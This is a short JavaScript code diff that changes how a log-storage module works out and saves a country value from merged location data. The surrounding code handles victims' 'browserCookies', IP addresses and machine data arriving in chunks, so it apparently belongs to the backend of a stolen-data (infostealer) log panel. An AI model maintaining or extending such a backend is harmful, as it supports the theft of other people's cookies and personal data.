@@ -331,6 +331,16 @@ const logsDb = {
             
             console.log(`Merged log summary - cookies: ${cookieCount}, browserCookies type: ${typeof mergedPcData.browserCookies}, isArray: ${Array.isArray(mergedPcData.browserCookies)}`);
             
+            // Extract country from merged location data if available (even if top-level country is "Unknown")
+            // This ensures that when location data arrives in a later chunk, we update the country correctly
+            let finalCountry = country || existingLog.country;
+            if (mergedPcData.location?.countryName && mergedPcData.location.countryName !== 'Unknown') {
+                finalCountry = mergedPcData.location.countryName;
+                console.log(`Updating country from location data: ${finalCountry}`);
+            } else if (country && country !== 'Unknown') {
+                finalCountry = country;
+            }
+            
             // Update the log - check if updated_at column exists first
             let updateQuery = `
                 UPDATE logs 
@@ -338,7 +348,7 @@ const logsDb = {
             `;
             const updateParams = [
                 ip || existingLog.ip,
-                country || existingLog.country,
+                finalCountry,
                 date || existingLog.date,
                 JSON.stringify(mergedDataSummary),
                 JSON.stringify(mergedPcData)
